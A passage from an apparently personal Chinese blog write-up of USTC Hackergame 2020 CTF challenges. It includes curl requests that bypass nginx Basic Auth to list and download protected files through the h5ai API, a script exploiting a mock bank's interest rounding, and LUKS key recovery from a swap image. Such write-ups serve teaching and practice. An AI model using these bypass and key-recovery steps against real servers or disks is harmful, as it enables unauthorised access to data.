Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img 